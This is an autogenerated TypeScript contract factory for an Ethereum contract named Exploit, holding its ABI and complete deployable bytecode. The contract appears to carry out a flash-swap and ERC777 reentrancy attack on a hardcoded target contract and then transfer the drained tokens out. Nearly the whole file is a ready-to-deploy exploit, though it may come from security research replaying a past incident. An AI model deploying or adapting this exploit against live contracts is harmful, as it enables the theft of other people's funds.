/* Autogenerated file. Do not edit manually. */
/* tslint:disable */
/* eslint-disable */

import { Signer, utils, Contract, ContractFactory, Overrides } from "ethers";
import { Provider, TransactionRequest } from "@ethersproject/providers";
import type { Exploit, ExploitInterface } from "../Exploit";

const _abi = [
  {
    inputs: [],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    inputs: [],
    name: "attack",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "operator",
        type: "address",
      },
      {
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "amount",
        type: "uint256",
      },
      {
        internalType: "bytes",
        name: "data",
        type: "bytes",
      },
      {
        internalType: "bytes",
        name: "operatorData",
        type: "bytes",
      },
    ],
    name: "tokensReceived",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "sender",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "amount0",
        type: "uint256",
      },
      {
        internalType: "uint256",
        name: "amount1",
        type: "uint256",
      },
      {
        internalType: "bytes",
        name: "data",
        type: "bytes",
      },
    ],
    name: "uniswapV2Call",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const _bytecode =
  "0x608060405273b4e16d0168e52d35cacd2c6185b44281ec28c9dc6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073b8919522331c59f5c16bdfaa6a121a6e03a91f62600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060006003553480156200011457600080fd5b50731820a4b7618bde71dce8cdc73aab6c95905fad2473ffffffffffffffffffffffffffffffffffffffff166329965a1d307fb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b60001b306040518463ffffffff1660e01b81526004016200018b93929190620001e7565b600060405180830381600087803b158015620001a657600080fd5b505af1158015620001bb573d6000803e3d6000fd5b5050505062000262565b620001d08162000224565b82525050565b620001e18162000238565b82525050565b6000606082019050620001fe6000830186620001c5565b6200020d6020830185620001d6565b6200021c6040830184620001c5565b949350505050565b6000620002318262000242565b9050919050565b6000819050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b61101a80620002726000396000f3fe608060405234801561001057600080fd5b50600436106100405760003560e01c806223de291461004557806310d1e85c146100615780639e5faafc1461007d575b600080fd5b61005f600480360381019061005a919061088e565b610087565b005b61007b60048036038101906100769190610951565b610149565b005b6100856106ce565b005b60016003600082825461009a9190610bea565b9250508190555060026003541161013f57600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6aa57ce6501ed99d8d0006040518263ffffffff1660e01b815260040161010c9190610b4c565b600060405180830381600087803b15801561012657600080fd5b505af115801561013a573d6000803e3d6000fd5b505050505b5050505050505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16678ac7230489e800006040518363ffffffff1660e01b81526004016101d0929190610afa565b602060405180830381600087803b1580156101ea57600080fd5b505af11580156101fe573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061022291906109d1565b50600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6aa57ce6501ed99d8d0006040518263ffffffff1660e01b81526004016102849190610b4c565b600060405180830381600087803b15801561029e57600080fd5b505af11580156102b2573d6000803e3d6000fd5b50505050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663db006a75600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040161034f9190610adf565b60206040518083038186803b15801561036757600080fd5b505afa15801561037b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061039f91906109fa565b6040518263ffffffff1660e01b81526004016103bb9190610bb3565b600060405180830381600087803b1580156103d557600080fd5b505af11580156103e9573d6000803e3d6000fd5b50505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb33600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663313ce5676040518163ffffffff1660e01b815260040160206040518083038186803b15801561049457600080fd5b505afa1580156104a8573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104cc9190610a23565b600a6104d89190610cc4565b6103e86103e5896104e99190610c40565b6104f39190610de2565b6104fd9190610bea565b6040518363ffffffff1660e01b815260040161051a929190610b23565b602060405180830381600087803b15801561053457600080fd5b505af1158015610548573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061056c91906109d1565b50600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb32600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016106079190610adf565b60206040518083038186803b15801561061f57600080fd5b505afa158015610633573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061065791906109fa565b6040518363ffffffff1660e01b8152600401610674929190610b23565b602060405180830381600087803b15801561068e57600080fd5b505af11580156106a2573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106c691906109d1565b505050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663022c0d9f6505c8cd8a7000600030600167ffffffffffffffff811115610755577f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6040519080825280601f01601f1916602001820160405280156107875781602001600182028036833780820191505090505b506040518563ffffffff1660e01b81526004016107a79493929190610b67565b600060405180830381600087803b1580156107c157600080fd5b505af11580156107d5573d6000803e3d6000fd5b50505050565b6000813590506107ea81610f88565b92915050565b6000815190506107ff81610f9f565b92915050565b60008083601f84011261081757600080fd5b8235905067ffffffffffffffff81111561083057600080fd5b60208301915083600182028301111561084857600080fd5b9250929050565b60008135905061085e81610fb6565b92915050565b60008151905061087381610fb6565b92915050565b60008151905061088881610fcd565b92915050565b60008060008060008060008060c0898b0312156108aa57600080fd5b60006108b88b828c016107db565b98505060206108c98b828c016107db565b97505060406108da8b828c016107db565b96505060606108eb8b828c0161084f565b955050608089013567ffffffffffffffff81111561090857600080fd5b6109148b828c01610805565b945094505060a089013567ffffffffffffffff81111561093357600080fd5b61093f8b828c01610805565b92509250509295985092959890939650565b60008060008060006080868803121561096957600080fd5b6000610977888289016107db565b95505060206109888882890161084f565b94505060406109998882890161084f565b935050606086013567ffffffffffffffff8111156109b657600080fd5b6109c288828901610805565b92509250509295509295909350565b6000602082840312156109e357600080fd5b60006109f1848285016107f0565b91505092915050565b600060208284031215610a0c57600080fd5b6000610a1a84828501610864565b91505092915050565b600060208284031215610a3557600080fd5b6000610a4384828501610879565b91505092915050565b610a5581610e3c565b82525050565b6000610a6682610bce565b610a708185610bd9565b9350610a80818560208601610ed9565b610a8981610f6a565b840191505092915050565b610a9d81610e91565b82525050565b610aac81610ea3565b82525050565b610abb81610eb5565b82525050565b610aca81610ec7565b82525050565b610ad981610e7a565b82525050565b6000602082019050610af46000830184610a4c565b92915050565b6000604082019050610b0f6000830185610a4c565b610b1c6020830184610aa3565b9392505050565b6000604082019050610b386000830185610a4c565b610b456020830184610ad0565b9392505050565b6000602082019050610b616000830184610ab2565b92915050565b6000608082019050610b7c6000830187610ac1565b610b896020830186610a94565b610b966040830185610a4c565b8181036060830152610ba88184610a5b565b905095945050505050565b6000602082019050610bc86000830184610ad0565b92915050565b600081519050919050565b600082825260208201905092915050565b6000610bf582610e7a565b9150610c0083610e7a565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115610c3557610c34610f0c565b5b828201905092915050565b6000610c4b82610e7a565b9150610c5683610e7a565b925082610c6657610c65610f3b565b5b828204905092915050565b6000808291508390505b6001851115610cbb57808604811115610c9757610c96610f0c565b5b6001851615610ca65780820291505b8081029050610cb485610f7b565b9450610c7b565b94509492505050565b6000610ccf82610e7a565b9150610cda83610e84565b9250610d077fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8484610d0f565b905092915050565b600082610d1f5760019050610ddb565b81610d2d5760009050610ddb565b8160018114610d435760028114610d4d57610d7c565b6001915050610ddb565b60ff841115610d5f57610d5e610f0c565b5b8360020a915084821115610d7657610d75610f0c565b5b50610ddb565b5060208310610133831016604e8410600b8410161715610db15782820a905083811115610dac57610dab610f0c565b5b610ddb565b610dbe8484846001610c71565b92509050818404811115610dd557610dd4610f0c565b5b81810290505b9392505050565b6000610ded82610e7a565b9150610df883610e7a565b9250817fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0483118215151615610e3157610e30610f0c565b5b828202905092915050565b6000610e4782610e5a565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600060ff82169050919050565b6000610e9c82610e7a565b9050919050565b6000610eae82610e7a565b9050919050565b6000610ec082610e7a565b9050919050565b6000610ed282610e7a565b9050919050565b60005b83811015610ef7578082015181840152602081019050610edc565b83811115610f06576000848401525b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000601f19601f8301169050919050565b60008160011c9050919050565b610f9181610e3c565b8114610f9c57600080fd5b50565b610fa881610e4e565b8114610fb357600080fd5b50565b610fbf81610e7a565b8114610fca57600080fd5b50565b610fd681610e84565b8114610fe157600080fd5b5056fea264697066735822122079ef0270dc8c2a310e732f9e45cba32d9e2d7646e8042ae44836f67d58020f0464736f6c63430008040033";

export class Exploit__factory extends ContractFactory {
  constructor(
    ...args: [signer: Signer] | ConstructorParameters<typeof ContractFactory>
  ) {
    if (args.length === 1) {
      super(_abi, _bytecode, args[0]);
    } else {
      super(...args);
    }
  }

  deploy(
    overrides?: Overrides & { from?: string | Promise<string> }
  ): Promise<Exploit> {
    return super.deploy(overrides || {}) as Promise<Exploit>;
  }
  getDeployTransaction(
    overrides?: Overrides & { from?: string | Promise<string> }
  ): TransactionRequest {
    return super.getDeployTransaction(overrides || {});
  }
  attach(address: string): Exploit {
    return super.attach(address) as Exploit;
  }
  connect(signer: Signer): Exploit__factory {
    return super.connect(signer) as Exploit__factory;
  }
  static readonly bytecode = _bytecode;
  static readonly abi = _abi;
  static createInterface(): ExploitInterface {
    return new utils.Interface(_abi) as ExploitInterface;
  }
  static connect(
    address: string,
    signerOrProvider: Signer | Provider
  ): Exploit {
    return new Contract(address, _abi, signerOrProvider) as Exploit;
  }
}
